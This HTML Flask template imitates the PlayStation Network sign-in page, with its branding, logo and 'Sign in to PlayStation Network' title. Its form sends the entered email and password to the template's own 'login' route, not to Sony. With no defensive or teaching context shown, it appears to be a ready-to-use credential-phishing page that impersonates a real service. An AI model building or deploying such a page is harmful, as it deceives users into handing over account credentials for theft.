<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PlayStation Network - Sign In</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: "Ssst", SST, "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #1f1f1f;
            color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px 16px;
        }
        .psn-container {
            width: 100%;
            max-width: 400px;
            background: #1f1f1f;
            border-radius: 12px;
            padding: 40px 32px;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }
        .psn-logo { width: 60px; margin-bottom: 20px; }
        .psn-title { font-size: 20px; font-weight: 500; margin-bottom: 28px; text-align: center; }
        .psn-form { width: 100%; display: flex; flex-direction: column; gap: 20px; }
        .psn-input-wrapper { position: relative; }
        .psn-input {
            width: 100%;
            height: 48px;
            background: #2a2a2a;
            border: 1px solid #404040;
            border-radius: 4px;
            padding: 0 14px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
        }
        .psn-input:focus { border-color: #0070d1; }
        .psn-btn {
            width: 100%;
            height: 44px;
            background: #0070d1;
            color: #fff;
            border: none;
            border-radius: 22px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .psn-btn:hover { background: #005bb5; }
        .psn-link { color: #0070d1; font-size: 13px; text-decoration: none; text-align: center; display: block; margin-top: 12px; }
        .psn-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="psn-container">
        <svg class="psn-logo" viewBox="0 0 24 24" fill="#0070d1">
            <path d="M8.482 17.18c.997.26 2.091.243 3.018-.086V12.78l-2.037-.582v2.336l-.981-.334V11.84L6.155 11.2v3.743c0 .265.047.532.228.718.423.435 1.258.623 2.099.819zm14.654-2.529c-.068-.31-.322-.524-.627-.615l-6.857-1.921V9.336l3.52 1.009c.307.088.583.003.719-.234.137-.238.07-.57-.236-.657l-4.003-1.15-3.315-.951c-.696-.198-1.429-.029-1.92.428-.49.458-.698 1.139-.698 1.859v6.59l1.836.529v-2.311l1.163.332v2.312l7.108 2.017c.105.03.211.045.318.045.541 0 .979-.395 1.052-1.054zM.864 15.011l3.811 1.091V13.79l-1.974-.564v-.981l1.974.563v-2.172L.864 9.539v5.472z"/>
        </svg>

        <h2 class="psn-title">Sign in to PlayStation Network</h2>

        <form class="psn-form" action="{{ url_for('login') }}" method="POST">
            <div class="psn-input-wrapper">
                <input type="email" name="username" class="psn-input" placeholder="Sign-in ID (Email Address)" required />
            </div>

            <div class="psn-input-wrapper">
                <input type="password" name="password" class="psn-input" placeholder="Password" required />
            </div>

            <button type="submit" class="psn-btn">Sign In</button>
        </form>

        <a href="#" class="psn-link">Trouble Signing In?</a>
    </div>
</body>
</html>
